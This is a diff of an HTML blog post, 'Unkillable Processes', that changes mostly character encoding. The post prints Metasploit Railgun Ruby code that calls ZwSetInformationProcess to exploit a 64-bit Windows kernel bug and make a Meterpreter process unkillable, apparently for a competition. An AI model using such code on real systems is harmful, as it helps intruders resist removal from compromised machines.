@@ -6,7 +6,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 <meta name="author" content="">
 <meta name="description" content="Saw this post about a kernel bug in 64 bit Windows that is a DoS, it can also create an unkillable process: Blog post: http://waleedassar.blogspot.com/2013/02/kernel-bug-1-processiopriority.html
-Figured I&#39;d take a swing at making a module that I could put Meterpreter into an unkillable state. Good times at CCDC could be had.
+Figured I&amp;rsquo;d take a swing at making a module that I could put Meterpreter into an unkillable state. Good times at CCDC could be had.
 Started with the C code for the bug: http://pastebin.com/QejGQXib along with the only resource I could find about the actual function: http://processhacker." />
 <meta name="keywords" content="" />
 <meta name="robots" content="noodp" />
@@ -34,7 +34,7 @@ Started with the C code for the bug: http://pastebin.com/QejGQXib along with the
 
 <meta itemprop="name" content="Unkillable Processes">
 <meta itemprop="description" content="Saw this post about a kernel bug in 64 bit Windows that is a DoS, it can also create an unkillable process: Blog post: http://waleedassar.blogspot.com/2013/02/kernel-bug-1-processiopriority.html
-Figured I&#39;d take a swing at making a module that I could put Meterpreter into an unkillable state. Good times at CCDC could be had.
+Figured I&rsquo;d take a swing at making a module that I could put Meterpreter into an unkillable state. Good times at CCDC could be had.
 Started with the C code for the bug: http://pastebin.com/QejGQXib along with the only resource I could find about the actual function: http://processhacker.">
 <meta itemprop="datePublished" content="2013-08-10T10:39:59-04:00" />
 <meta itemprop="dateModified" content="2013-08-10T10:39:59-04:00" />
@@ -45,7 +45,7 @@ Started with the C code for the bug: http://pastebin.com/QejGQXib along with the
 <meta itemprop="keywords" content="railgun,x64,incomplete,ccdc," /><meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="Unkillable Processes"/>
 <meta name="twitter:description" content="Saw this post about a kernel bug in 64 bit Windows that is a DoS, it can also create an unkillable process: Blog post: http://waleedassar.blogspot.com/2013/02/kernel-bug-1-processiopriority.html
-Figured I&#39;d take a swing at making a module that I could put Meterpreter into an unkillable state. Good times at CCDC could be had.
+Figured I&rsquo;d take a swing at making a module that I could put Meterpreter into an unkillable state. Good times at CCDC could be had.
 Started with the C code for the bug: http://pastebin.com/QejGQXib along with the only resource I could find about the actual function: http://processhacker."/>
 
 
@@ -121,34 +121,34 @@ Started with the C code for the bug: http://pastebin.com/QejGQXib along with the
             <div class="post-content">
                 <p>Saw this post about a kernel bug in 64 bit Windows that is a DoS, it can also create an unkillable process:
 Blog post: <a href="http://waleedassar.blogspot.com/2013/02/kernel-bug-1-processiopriority.html">http://waleedassar.blogspot.com/2013/02/kernel-bug-1-processiopriority.html</a></p>
-<p>Figured I'd take a swing at making a module that I could put Meterpreter into an unkillable state. Good times at CCDC could be had.</p>
+<p>Figured I&rsquo;d take a swing at making a module that I could put Meterpreter into an unkillable state. Good times at CCDC could be had.</p>
 <p>Started with the C code for the bug: <a href="http://pastebin.com/QejGQXib">http://pastebin.com/QejGQXib</a> along with the only resource I could find about the actual function: <a href="http://processhacker.sourceforge.net/doc/ntfill_8h.html#a6557e0dd024f0e9fa6132eb52d12810a">http://processhacker.sourceforge.net/doc/ntfill_8h.html#a6557e0dd024f0e9fa6132eb52d12810a</a></p>
 <p>I came up with this:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby">client<span style="color:#f92672">.</span>railgun<span style="color:#f92672">.</span>add_function(<span style="color:#e6db74">&#39;ntdll&#39;</span>,<span style="color:#e6db74">&#39;ZwSetInformationProcess&#39;</span>,<span style="color:#e6db74">&#39;DWORD&#39;</span>,<span style="color:#f92672">[</span>
-   <span style="color:#f92672">[</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">DWORD</span><span style="color:#e6db74">&#34;</span>,<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">ProcessHandle</span><span style="color:#e6db74">&#34;</span>,<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">in</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">]</span>,
-   <span style="color:#f92672">[</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">DWORD</span><span style="color:#e6db74">&#34;</span>,<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">ProcessInformationClass</span><span style="color:#e6db74">&#34;</span>,<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">in</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">]</span>,
-   <span style="color:#f92672">[</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">DWORD</span><span style="color:#e6db74">&#34;</span>,<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">ProcessInformation</span><span style="color:#e6db74">&#34;</span>,<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">inout</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">]</span>,
-   <span style="color:#f92672">[</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">DWORD</span><span style="color:#e6db74">&#34;</span>,<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">ProcessInformationLength</span><span style="color:#e6db74">&#34;</span>,<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">in</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">]</span>,
+   <span style="color:#f92672">[</span><span style="color:#e6db74">&#34;DWORD&#34;</span>,<span style="color:#e6db74">&#34;ProcessHandle&#34;</span>,<span style="color:#e6db74">&#34;in&#34;</span><span style="color:#f92672">]</span>,
+   <span style="color:#f92672">[</span><span style="color:#e6db74">&#34;DWORD&#34;</span>,<span style="color:#e6db74">&#34;ProcessInformationClass&#34;</span>,<span style="color:#e6db74">&#34;in&#34;</span><span style="color:#f92672">]</span>,
+   <span style="color:#f92672">[</span><span style="color:#e6db74">&#34;DWORD&#34;</span>,<span style="color:#e6db74">&#34;ProcessInformation&#34;</span>,<span style="color:#e6db74">&#34;inout&#34;</span><span style="color:#f92672">]</span>,
+   <span style="color:#f92672">[</span><span style="color:#e6db74">&#34;DWORD&#34;</span>,<span style="color:#e6db74">&#34;ProcessInformationLength&#34;</span>,<span style="color:#e6db74">&#34;in&#34;</span><span style="color:#f92672">]</span>,
 <span style="color:#f92672">]</span>)
 processinfo <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x8000F129</span>
-<span style="color:#f92672"></span>tproc <span style="color:#f92672">=</span> client<span style="color:#f92672">.</span>sys<span style="color:#f92672">.</span>process<span style="color:#f92672">.</span>open
-tmem <span style="color:#f92672">=</span> tproc<span style="color:#f92672">.</span>memory<span style="color:#f92672">.</span>allocate(<span style="color:#ae81ff">4</span><span style="color:#f92672"></span>)
+tproc <span style="color:#f92672">=</span> client<span style="color:#f92672">.</span>sys<span style="color:#f92672">.</span>process<span style="color:#f92672">.</span>open
+tmem <span style="color:#f92672">=</span> tproc<span style="color:#f92672">.</span>memory<span style="color:#f92672">.</span>allocate(<span style="color:#ae81ff">4</span>)
 tproc<span style="color:#f92672">.</span>memory<span style="color:#f92672">.</span>write(tmem,processinfo)
 cpidhandle <span style="color:#f92672">=</span> client<span style="color:#f92672">.</span>railgun<span style="color:#f92672">.</span>kernel32<span style="color:#f92672">.</span>GetCurrentProcess()<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;return&#39;</span><span style="color:#f92672">]</span>
-client<span style="color:#f92672">.</span>railgun<span style="color:#f92672">.</span>ntdll<span style="color:#f92672">.</span>ZwSetInformationProcess(cpidhandle,<span style="color:#ae81ff">0x21</span><span style="color:#f92672"></span>,tmem,<span style="color:#ae81ff">0x4</span><span style="color:#f92672"></span>)
+client<span style="color:#f92672">.</span>railgun<span style="color:#f92672">.</span>ntdll<span style="color:#f92672">.</span>ZwSetInformationProcess(cpidhandle,<span style="color:#ae81ff">0x21</span>,tmem,<span style="color:#ae81ff">0x4</span>)
 </code></pre></div><p>ScriptJunkie quickly identified that I was using a DWORD for a Handle and using 4 bits for a 64 bit process (should be 8) as well as the fact that I could use a PDWORD with the ProcessInformation inout parameter instead of writing it to memory myself.</p>
 <p>The result:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby">client<span style="color:#f92672">.</span>railgun<span style="color:#f92672">.</span>add_function(<span style="color:#e6db74">&#39;ntdll&#39;</span>,<span style="color:#e6db74">&#39;ZwSetInformationProcess&#39;</span>,<span style="color:#e6db74">&#39;DWORD&#39;</span>,<span style="color:#f92672">[</span>
-     <span style="color:#f92672">[</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">HANDLE</span><span style="color:#e6db74">&#34;</span>,<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">ProcessHandle</span><span style="color:#e6db74">&#34;</span>,<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">in</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">]</span>,
-     <span style="color:#f92672">[</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">DWORD</span><span style="color:#e6db74">&#34;</span>,<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">ProcessInformationClass</span><span style="color:#e6db74">&#34;</span>,<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">in</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">]</span>,
-     <span style="color:#f92672">[</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">PDWORD</span><span style="color:#e6db74">&#34;</span>,<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">ProcessInformation</span><span style="color:#e6db74">&#34;</span>,<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">inout</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">]</span>,
-     <span style="color:#f92672">[</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">DWORD</span><span style="color:#e6db74">&#34;</span>,<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">ProcessInformationLength</span><span style="color:#e6db74">&#34;</span>,<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">in</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">]</span>,
+     <span style="color:#f92672">[</span><span style="color:#e6db74">&#34;HANDLE&#34;</span>,<span style="color:#e6db74">&#34;ProcessHandle&#34;</span>,<span style="color:#e6db74">&#34;in&#34;</span><span style="color:#f92672">]</span>,
+     <span style="color:#f92672">[</span><span style="color:#e6db74">&#34;DWORD&#34;</span>,<span style="color:#e6db74">&#34;ProcessInformationClass&#34;</span>,<span style="color:#e6db74">&#34;in&#34;</span><span style="color:#f92672">]</span>,
+     <span style="color:#f92672">[</span><span style="color:#e6db74">&#34;PDWORD&#34;</span>,<span style="color:#e6db74">&#34;ProcessInformation&#34;</span>,<span style="color:#e6db74">&#34;inout&#34;</span><span style="color:#f92672">]</span>,
+     <span style="color:#f92672">[</span><span style="color:#e6db74">&#34;DWORD&#34;</span>,<span style="color:#e6db74">&#34;ProcessInformationLength&#34;</span>,<span style="color:#e6db74">&#34;in&#34;</span><span style="color:#f92672">]</span>,
 <span style="color:#f92672">]</span>)
 processinfo <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x8000F129</span>
-<span style="color:#f92672"></span>cpidhandle <span style="color:#f92672">=</span> client<span style="color:#f92672">.</span>railgun<span style="color:#f92672">.</span>kernel32<span style="color:#f92672">.</span>GetCurrentProcess()<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;return&#39;</span><span style="color:#f92672">]</span>
-client<span style="color:#f92672">.</span>railgun<span style="color:#f92672">.</span>ntdll<span style="color:#f92672">.</span>ZwSetInformationProcess(cpidhandle,<span style="color:#ae81ff">0x21</span><span style="color:#f92672"></span>,processinfo,<span style="color:#ae81ff">0x4</span><span style="color:#f92672"></span>)
-</code></pre></div><p>Which results in a process that you can't kill, but the process is also non-functioning as far as I can tell because the Meterpreter session dies.</p>
-<p>I'm curious if with some tweaking I can get it to act much like the KillMe.exe
+cpidhandle <span style="color:#f92672">=</span> client<span style="color:#f92672">.</span>railgun<span style="color:#f92672">.</span>kernel32<span style="color:#f92672">.</span>GetCurrentProcess()<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;return&#39;</span><span style="color:#f92672">]</span>
+client<span style="color:#f92672">.</span>railgun<span style="color:#f92672">.</span>ntdll<span style="color:#f92672">.</span>ZwSetInformationProcess(cpidhandle,<span style="color:#ae81ff">0x21</span>,processinfo,<span style="color:#ae81ff">0x4</span>)
+</code></pre></div><p>Which results in a process that you can&rsquo;t kill, but the process is also non-functioning as far as I can tell because the Meterpreter session dies.</p>
+<p>I&rsquo;m curious if with some tweaking I can get it to act much like the KillMe.exe
 <a href="https://code.google.com/p/ollytlscatch/downloads/detail?name=KillMe.exe">https://code.google.com/p/ollytlscatch/downloads/detail?name=KillMe.exe</a></p>
 <p>Which continues to operate just fine after the modification happens.</p>
 
